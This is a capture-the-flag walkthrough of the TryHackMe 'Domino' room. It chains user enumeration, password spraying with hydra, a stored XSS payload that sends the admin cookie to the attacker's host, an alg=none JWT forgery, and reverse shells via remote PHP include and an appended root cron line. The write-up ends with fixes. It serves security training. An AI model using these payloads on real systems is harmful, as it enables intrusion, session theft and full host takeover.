@@ -1,0 +1,199 @@
+---
+title: 'Domino'
+description: 'A five-stage web chain on NexusCorp Portal: enumerate users, log in with weak passwords, steal an admin cookie via stored XSS, forge an alg=none JWT into RCE as www-data, reuse a leaked DB password to pivot to devops, then ride a world-writable root cron to full root.'
+date: 2026-06-22
+platform: tryhackme
+room: 'Domino'
+roomUrl: 'https://tryhackme.com/room/domino'
+difficulty: medium
+tags:
+  - 'web'
+  - 'php'
+  - 'stored-xss'
+  - 'cookie-theft'
+  - 'session-hijacking'
+  - 'jwt'
+  - 'rce'
+  - 'crypto'
+  - 'linux'
+  - 'privesc'
+vulnClasses:
+  - 'stored cross-site scripting'
+  - 'session cookie theft'
+  - 'hardcoded credentials'
+  - 'authentication bypass'
+  - 'weak credentials'
+  - 'password reuse'
+  - 'writable scheduled task'
+translation: done
+draft: false
+---
+
+_A walkthrough of the "Domino" room from TryHackMe. The NexusCorp Portal falls like a line of dominoes: a client-side secret and weak passwords get us in, a stored XSS steals an admin cookie, a forged_ _`alg=none`_ _JWT turns an admin file feature into RCE, a reused database password walks us sideways to a real user, and a world-writable root cron finishes the job._
+
+> Domino is an authorized training challenge on TryHackMe; everything here was performed against a legal practice target. All five flags, the leaked keys, and every recovered credential are shown as `THM{<redacted>}` / `<redacted>` — real on the box, withheld here.
+
+---
+
+### **TL;DR**
+
+<Callout type="tldr">
+
+Harvest staff emails from `team.php` to build a user list → `static/app.js` leaks a **hardcoded AES-ECB backup key** and the JWT/session design → brute-force the login and three accounts use trivial passwords → the session cookie is **not** **`HttpOnly`**, so a **stored XSS** in a ticket exfiltrates the admin's `nexus_session` cookie → replay it for the admin panel and **flag 3** → the JWT check accepts **`alg=none`**, so forge an admin token and abuse the file-include feature for **RCE as www-data** (flag) → `config.php` leaks a DB password that is **reused** for the `devops` user (flag) → a root cron runs a **group-writable** `health_report.sh`, append a reverse shell for **root** (flag).
+
+</Callout>
+
+### **The target**
+
+```text
+export IP=<target-ip>
+export ATTACKER_IP=<your-ip>
+```
+
+`nmap` shows just SSH and an Apache/PHP site — the "NexusCorp Portal":
+
+```text
+22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu
+80/tcp open  http    Apache httpd 2.4.58 ((Ubuntu))  # NexusCorp Portal
+```
+
+### **The vulnerability**
+
+Domino is a teaching stack of web mistakes layered on top of each other: secrets shipped to the browser, passwords that survive a dictionary, a cookie reachable from JavaScript, a JWT verifier that trusts the attacker, and a privileged cron script the low-priv user can edit.
+
+<Callout type="insight">
+
+Two broken-authentication primitives do the heavy lifting. First, the session cookie lacks `HttpOnly`, which converts an ordinary stored XSS into **full session theft**. Second, the JWT validation accepts the **`alg=none`** header — meaning a token with _no signature_ is treated as valid, so you can simply declare yourself an admin. Neither requires cracking a secret; both are logic flaws.
+
+</Callout>
+
+### **Step 1 — build a user list and read the client-side secrets**
+
+The public team page lists staff emails; strip them down to usernames:
+
+```text
+curl -s http://$IP/team.php | grep -o 'mailto:[^\">]*' | cut -d ':' -f2 > emails.txt
+cut -d '@' -f1 emails.txt > users.txt
+```
+
+The forgot-password page returns a different message for valid vs. invalid accounts (classic **username enumeration**), confirming the list. A content scan then surfaces the interesting paths:
+
+```text
+gobuster dir -u http://$IP/ -w /usr/share/wordlists/dirb/big.txt -t 100
+# admin/  api/  backup/  static/  support/ ...
+```
+
+Reading `static/app.js` is the jackpot: it hardcodes the backup-config encryption key and reveals the auth design (an **AES-128-ECB** blob, plus `nexus_session` and `nexus_jwt` issued by `/api/auth/token.php`):
+
+```text
+// leaked in static/app.js
+backupKey: '<redacted-backup-key>'   // AES-128-ECB
+```
+
+With the key in hand, `config.enc` decrypts cleanly (14 ASCII key chars + 2 null bytes = a 16-byte AES key):
+
+```text
+python3 decrypt_config.py config.enc
+# {"app_name":"NexusCorp Portal","version":"2.3.1","deploy_env":"production","system_user":"devops"}
+```
+
+### **Step 2 — weak-password login**
+
+Spraying the username list against the login form with a common-password list lands three hits — all using the same trivial dictionary word:
+
+```text
+hydra -L users.txt -P xato-net-10-million-passwords-10000.txt $IP \
+  http-post-form '/index.php:username=^USER^&password=^PASS^:Invalid credentials' -I
+# sarah.johnson / robert.wilson / emma.taylor  -> <redacted weak password>
+```
+
+Logged in, the dashboard exposes a ticketing system and an API-backed file viewer that wants a JWT from `/api/auth/token.php`.
+
+### **Step 3 — stored XSS → steal the admin cookie (flag)**
+
+The session cookie is served without `HttpOnly`, so JavaScript can read it. We submit a ticket whose body is an XSS payload; when the admin bot opens it, the cookie is beaconed to us:
+
+```text
+<body onload="new Image().src='http://$ATTACKER_IP/?c='+document.cookie;">
+```
+
+A simple listener catches the admin's `nexus_session` (it base64-decodes to `{"user_id":1,"username":"laura.hayes","role":"admin"}` with an HMAC tail). Replace our cookie with it and the admin panel opens — holding the first flag:
+
+```text
+THM{<redacted>}
+```
+
+### **Step 4 — forge an** **`alg=none`** **JWT → RCE as www-data (flag)**
+
+The file feature needs a JWT. The verifier accepts the `none` algorithm, so we build an unsigned token claiming the admin role — no secret required — and send it as `Authorization: Bearer`. The include handler then evaluates remote PHP, and crucially it evaluates PHP **even without** **`<?php ?>`** **tags**. We host a reverse shell and get executed:
+
+```text
+# attacker
+php -S 0.0.0.0:80      # serving shell.php (pentestmonkey reverse shell)
+nc -lvnp 4444
+```
+
+```text
+# caught
+uid=33(www-data) gid=33(www-data)
+www-data@tryhackme-2404:/opt$ cat flag3.txt
+THM{<redacted>}
+```
+
+### **Step 5 — reuse the DB password → devops (flag)**
+
+`config.php` in the web root spills the application's secrets, including a database password. That same password works for the local `devops` user (confirmed present in `/etc/passwd`, and foreshadowed by the decrypted config's `system_user: devops`):
+
+```text
+www-data@...:/var/www/html$ cat config.php
+# DB_PASS = '<redacted>'   JWT_SECRET / APP_SECRET also present
+www-data@...:/opt$ su devops    # same password -> success
+devops@...:~$ cat user.txt
+THM{<redacted>}
+```
+
+### **Step 6 — world-writable root cron → root (flag)**
+
+`devops` cannot sudo, but `pspy` shows root running a monitoring script on a timer:
+
+```text
+CMD: UID=0  PID=1902 | /bin/bash /opt/monitoring/health_report.sh
+```
+
+The script is owned by root but **writable by the** **`devops`** **group** (`-rwxrwxr-- root devops`). We append a reverse shell and wait for the next tick:
+
+```text
+echo 'busybox nc $ATTACKER_IP 4445 -e /bin/bash' >> /opt/monitoring/health_report.sh
+# attacker: nc -lvnp 4445  ->  uid=0(root)
+root@...:~# cat /root/root.txt
+THM{<redacted>}
+```
+
+### **Impact**
+
+<Callout type="critical">
+
+**Critical — CVSS 3.1 \~9.8** (`AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H`). An unauthenticated attacker chains client-side secret exposure, weak credentials, a non-`HttpOnly` session cookie (stored-XSS session theft), and an `alg=none` JWT bypass into remote code execution. Credential reuse and a group-writable root cron then escalate from the web user to full root — complete compromise of the host and all application data.
+
+</Callout>
+
+### **Recommended fix**
+
+<Callout type="fix">
+
+- **Never ship secrets to the browser.** The AES backup key in `app.js` and the whole auth design should be server-side only.
+- **Set** **`HttpOnly`** **(and** **`Secure`\*\***,\*\* **`SameSite`\*\***) on session cookies\*\*, and encode/escape all user-supplied ticket content to kill the stored XSS.
+- **Pin the JWT algorithm.** Reject `none` and any algorithm other than the one you issue; verify the signature with a server-held key.
+- **Enforce strong, unique passwords** and stop reusing the DB password for OS accounts.
+- **Fix file permissions on privileged cron scripts** — root-run scripts must not be writable by non-root groups.
+
+</Callout>
+
+### **Takeaways**
+
+- **Anything in client-side JS is public.** A hardcoded key or an exposed auth design is a gift to the attacker.
+- **`HttpOnly`** **is what stands between an XSS and a session takeover.** Without it, one stored payload is game over.
+- **`alg=none`** **is a signature-less door.** A JWT library that honours it trusts whatever the client claims.
+- **Privilege escalation is often a permissions typo** — a root cron one group-write bit away from root.
+
+Domino earns its name: each weak link topples the next. Thanks for reading.
